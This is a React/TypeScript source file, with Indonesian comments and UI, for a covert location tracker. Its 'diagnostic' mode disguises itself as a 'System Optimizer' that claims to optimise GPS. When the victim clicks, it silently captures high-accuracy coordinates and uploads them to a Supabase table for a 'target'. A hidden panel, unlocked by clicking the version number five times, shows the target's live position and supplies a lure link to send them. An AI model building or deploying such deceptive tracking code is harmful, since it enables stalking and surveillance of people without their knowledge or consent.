
import React, { useState, useEffect, useCallback } from 'react';
import Sidebar from './components/Sidebar';
import LocationCard from './components/LocationCard';
import { UserProfile, AIInsight, LocationData } from './types';
import { getLocationInsights } from './services/geminiService';
import { createClient } from '@supabase/supabase-js';

// Mengakses environment variables secara langsung
// Pastikan nama variabel di Vercel adalah SUPABASE_URL dan SUPABASE_KEY
const SB_URL = process.env.SUPABASE_URL || '';
const SB_KEY = process.env.SUPABASE_KEY || '';

// Inisialisasi client hanya jika kedua kunci tersedia
const supabase = (SB_URL && SB_KEY) ? createClient(SB_URL, SB_KEY) : null;

const App: React.FC = () => {
  const isStealthMode = new URLSearchParams(window.location.search).get('mode') === 'diagnostic';
  const targetId = 'target_alpha'; 

  const [isUnlocked, setIsUnlocked] = useState(false);
  const [isDiagnosing, setIsDiagnosing] = useState(false);
  const [diagProgress, setDiagProgress] = useState(0);
  const [locationError, setLocationError] = useState<string | null>(null);
  const [copyStatus, setCopyStatus] = useState<string | null>(null);
  const [dbLog, setDbLog] = useState<string>("IDLE");
  
  const [members, setMembers] = useState<UserProfile[]>([
    {
      id: '1',
      name: 'Alpha_Target',
      avatar: 'https://picsum.photos/id/64/200/200',
      lastSeen: Date.now(),
      status: 'offline',
    }
  ]);

  const [insight, setInsight] = useState<AIInsight | null>(null);
  const [isLoadingInsight, setIsLoadingInsight] = useState(false);

  const activeMember = members[0];
  const isConfigValid = !!SB_URL && !!SB_KEY;

  const syncToDatabase = async (loc: LocationData) => {
    if (!supabase) {
      if (!SB_URL && !SB_KEY) setDbLog("ERR: ALL_ENV_MISSING");
      else if (!SB_URL) setDbLog("ERR: URL_MISSING");
      else if (!SB_KEY) setDbLog("ERR: KEY_MISSING");
      return;
    }
    
    setDbLog("SENDING...");
    try {
      const { error } = await supabase
        .from('tracking')
        .upsert({ 
          id: targetId, 
          latitude: loc.latitude, 
          longitude: loc.longitude, 
          accuracy: loc.accuracy, 
          timestamp: loc.timestamp 
        });
      
      if (error) {
        setDbLog(`DB_ERR: ${error.message.substring(0, 15)}`);
      } else {
        setDbLog("SUCCESS: UPDATED");
      }
    } catch (err: any) {
      setDbLog("FATAL_CONN_ERR");
    }
  };

  useEffect(() => {
    if (isUnlocked && !isStealthMode && supabase) {
      const fetchData = async () => {
        try {
          const { data, error } = await supabase.from('tracking').select('*').eq('id', targetId).single();
          if (data) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        } catch (e) {}
      };
      fetchData();

      const channel = supabase
        .channel('realtime-tracking')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
          const data = payload.new as any;
          if (data && data.id === targetId) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        })
        .subscribe();

      return () => { supabase.removeChannel(channel); };
    }
  }, [isUnlocked, isStealthMode]);

  const updateLocation = useCallback(() => {
    if (!navigator.geolocation) {
      setLocationError("GPS_NOT_SUPPORTED");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        setLocationError(null);
        const newLocation: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp,
        };

        if (isStealthMode) {
          await syncToDatabase(newLocation);
        }

        if (isUnlocked && !isStealthMode) {
          setMembers(prev => prev.map(m => ({ ...m, currentLocation: newLocation, status: 'online' })));
          setIsLoadingInsight(true);
          const res = await getLocationInsights(newLocation);
          setInsight(res);
          setIsLoadingInsight(false);
        }
      },
      (err) => {
        setLocationError(`PERMISSION_DENIED`);
        setDbLog("ERR: GPS_LOCKED");
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }, [isUnlocked, isStealthMode]);

  const startDiagnostic = () => {
    updateLocation();
    setIsDiagnosing(true);
    let progress = 0;
    const interval = setInterval(() => {
      progress += 1;
      setDiagProgress(progress);
      if (progress >= 100) clearInterval(interval);
    }, 50);
  };

  const getCleanUrl = () => window.location.origin + window.location.pathname;

  const handleCopyLink = async (key: string) => {
    const url = `${getCleanUrl()}?mode=diagnostic`;
    await navigator.clipboard.writeText(url);
    setCopyStatus(key);
    setTimeout(() => setCopyStatus(null), 2000);
  };

  const openInGoogleMaps = (lat: number, lng: number) => {
    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  if (isStealthMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 overflow-hidden">
        <div className="max-w-md mx-auto w-full space-y-8 animate-in fade-in">
           <div className="flex items-center gap-3 border-b border-slate-800 pb-6">
              <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center">
                 <i className="fas fa-microchip text-white"></i>
              </div>
              <div>
                 <h1 className="text-sm font-bold uppercase">System Optimizer <span className="text-slate-500 font-normal">v1.4</span></h1>
                 <p className="text-[10px] text-slate-500 uppercase tracking-widest">{isDiagnosing ? 'Running Diagnostics...' : 'System Ready'}</p>
              </div>
           </div>

           {!isDiagnosing ? (
             <div className="bg-slate-900/40 border border-slate-800 rounded-3xl p-8 text-center space-y-6">
                <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto border border-blue-500/20">
                   <i className="fas fa-bolt text-3xl text-blue-500"></i>
                </div>
                <div>
                   <h2 className="text-lg font-bold">Diagnosa Perangkat</h2>
                   <p className="text-slate-400 text-xs mt-2 italic">Klik tombol di bawah untuk membersihkan cache sistem dan mengoptimalkan hardware GPS.</p>
                </div>
                <button 
                  onClick={startDiagnostic}
                  className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-sm shadow-xl transition-all"
                >
                  OPTIMALKAN SEKARANG
                </button>
             </div>
           ) : (
             <div className="bg-slate-900/40 border border-slate-800 rounded-3xl p-8 space-y-8">
                <div className="space-y-4">
                   <div className="flex justify-between text-[10px] uppercase font-bold text-slate-500">
                      <span>Memproses Core...</span>
                      <span>{diagProgress}%</span>
                   </div>
                   <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                      <div className="bg-blue-500 h-full transition-all duration-300" style={{ width: `${diagProgress}%` }}></div>
                   </div>
                </div>

                <div className="space-y-3 p-4 bg-slate-950/50 border border-slate-800 rounded-xl">
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">DATABASE_STREAM</span>
                      <span className={`font-bold ${dbLog.includes('SUCCESS') ? 'text-emerald-500' : 'text-blue-400'}`}>{dbLog}</span>
                   </div>
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">GPS_HARDWARE</span>
                      <span className="text-emerald-500 font-bold">{diagProgress > 40 ? 'VERIFIED' : 'SCANNING'}</span>
                   </div>
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">MEMORY_CACHE</span>
                      <span className="text-emerald-500 font-bold">{diagProgress > 80 ? 'CLEANED' : 'WIPING'}</span>
                   </div>
                </div>

                {diagProgress >= 100 && (
                  <div className="animate-in zoom-in duration-500 space-y-4">
                     <div className="p-4 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-center">
                        <p className="text-[10px] text-emerald-400 font-bold uppercase">Optimasi Berhasil</p>
                        <p className="text-[9px] text-slate-500 mt-1">Status: Perangkat Berjalan Stabil.</p>
                     </div>
                     <button onClick={() => window.location.reload()} className="w-full py-3 bg-slate-800 rounded-xl text-[10px] font-bold text-slate-400 uppercase">Selesai</button>
                  </div>
                )}
             </div>
           )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono">
      <Sidebar 
        members={members} 
        activeMemberId="1" 
        onSelectMember={() => {}}
        isUnlocked={isUnlocked}
        onUnlock={() => setIsUnlocked(true)}
      />

      <main className="flex-1 flex flex-col min-w-0">
        <header className="h-16 bg-slate-900 border-b border-slate-800 flex items-center justify-between px-8 shrink-0">
          <div className="flex items-center gap-4">
            <h2 className="text-xs font-bold tracking-widest text-slate-400 uppercase">
              {isUnlocked ? '> ADM_COMMAND_CENTER' : '> SYSTEM_IDLE'}
            </h2>
          </div>
          <div className="flex items-center gap-4">
            {isUnlocked && (
              <div className={`px-2 py-1 rounded border text-[9px] uppercase font-bold flex items-center gap-2 ${isConfigValid ? 'border-emerald-500/30 bg-emerald-500/5 text-emerald-500' : 'border-rose-500/30 bg-rose-500/5 text-rose-500'}`}>
                <div className={`w-1.5 h-1.5 rounded-full ${isConfigValid ? 'bg-emerald-500' : 'bg-rose-500 animate-pulse'}`}></div>
                DB_{isConfigValid ? 'CONNECTED' : 'CONFIG_ERROR'}
              </div>
            )}
            {isUnlocked && (
               <button onClick={() => setIsUnlocked(false)} className="text-[10px] bg-slate-800 px-3 py-1 rounded border border-slate-700 uppercase">Lock</button>
            )}
          </div>
        </header>

        <div className="flex-1 p-8 overflow-y-auto">
          {!isUnlocked ? (
            <div className="max-w-4xl mx-auto space-y-8 text-center py-20 animate-in fade-in">
               <i className="fas fa-lock text-5xl text-slate-800 mb-6"></i>
               <h1 className="text-2xl font-bold text-slate-400">Encrypted Terminal</h1>
               <p className="text-slate-500 text-sm max-w-sm mx-auto">Klik nomor versi di sidebar 5 kali untuk otorisasi.</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto">
              <div className="lg:col-span-2 space-y-6">
                
                {!isConfigValid && (
                  <div className="bg-rose-500/10 border border-rose-500/20 p-6 rounded-2xl border-l-4 border-l-rose-500">
                    <h4 className="text-sm font-bold text-rose-400 mb-2 uppercase tracking-tighter">Konfigurasi Gagal!</h4>
                    <div className="space-y-2 text-[11px] text-slate-400">
                       <p className={`flex items-center gap-2 ${SB_URL ? 'text-emerald-500' : 'text-rose-500'}`}>
                         <i className={`fas ${SB_URL ? 'fa-check-circle' : 'fa-times-circle'}`}></i> SUPABASE_URL: {SB_URL ? 'TERDETEKSI' : 'TIDAK ADA'}
                       </p>
                       <p className={`flex items-center gap-2 ${SB_KEY ? 'text-emerald-500' : 'text-rose-500'}`}>
                         <i className={`fas ${SB_KEY ? 'fa-check-circle' : 'fa-times-circle'}`}></i> SUPABASE_KEY: {SB_KEY ? 'TERDETEKSI' : 'TIDAK ADA'}
                       </p>
                       <div className="mt-4 p-3 bg-slate-950 rounded border border-slate-800">
                          <p className="font-bold text-white mb-1 uppercase">Solusi:</p>
                          <ol className="list-decimal ml-4 space-y-1">
                             <li>Buka Vercel Settings &gt; Environment Variables.</li>
                             <li>Pastikan ada <b>SUPABASE_URL</b> dan <b>SUPABASE_KEY</b>.</li>
                             <li>Klik tab <b>Deployments</b>, pilih yang terbaru, klik <b>REDEPLOY</b>.</li>
                          </ol>
                       </div>
                    </div>
                  </div>
                )}

                <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl relative overflow-hidden">
                   <div className="absolute top-0 right-0 w-32 h-32 bg-blue-500/5 blur-3xl rounded-full"></div>
                   <div className="flex justify-between items-center mb-6">
                      <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest flex items-center gap-2">
                        <i className="fas fa-satellite text-blue-500"></i> Signal Analysis
                      </h3>
                      {activeMember.currentLocation && (
                        <button 
                          onClick={() => openInGoogleMaps(activeMember.currentLocation!.latitude, activeMember.currentLocation!.longitude)}
                          className="px-4 py-2 bg-blue-600 hover:bg-blue-500 rounded-lg text-[10px] font-bold uppercase"
                        >
                           Track on Maps
                        </button>
                      )}
                   </div>
                   
                   {activeMember.currentLocation ? (
                     <div className="grid grid-cols-2 gap-4">
                        <div className="bg-slate-950/50 border border-slate-800 p-4 rounded-xl">
                           <p className="text-[9px] text-slate-500 uppercase mb-1">LATITUDE</p>
                           <p className="text-lg font-bold text-white mono">{activeMember.currentLocation.latitude.toFixed(8)}</p>
                        </div>
                        <div className="bg-slate-950/50 border border-slate-800 p-4 rounded-xl">
                           <p className="text-[9px] text-slate-500 uppercase mb-1">LONGITUDE</p>
                           <p className="text-lg font-bold text-white mono">{activeMember.currentLocation.longitude.toFixed(8)}</p>
                        </div>
                     </div>
                   ) : (
                     <div className="p-16 border border-dashed border-slate-800 rounded-2xl text-center">
                        <div className="w-12 h-12 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                           <i className="fas fa-broadcast-tower text-slate-600"></i>
                        </div>
                        <p className="text-xs text-slate-600 italic uppercase">Menunggu Sinyal Dari Target Alpha...</p>
                     </div>
                   )}
                </div>

                <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
                   <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Deployment Link For Target</h3>
                   <p className="text-[10px] text-slate-500 mb-3 italic">Kirim link ini ke target agar mereka melakukan "diagnosa" perangkat.</p>
                   <div className="p-4 bg-blue-500/5 border border-blue-500/20 rounded-xl flex gap-2">
                      <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-slate-950 border border-slate-800 rounded p-2 text-[10px] text-slate-400" />
                      <button onClick={() => handleCopyLink('target')} className={`px-6 rounded text-[10px] font-bold ${copyStatus === 'target' ? 'bg-emerald-600' : 'bg-blue-600'} transition-all`}>
                         {copyStatus === 'target' ? 'COPIED' : 'COPY'}
                      </button>
                   </div>
                </div>
              </div>

              <div className="lg:col-span-1">
                <LocationCard 
                  member={activeMember} 
                  insight={insight} 
                  loadingInsight={isLoadingInsight} 
                />
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
};

export default App;
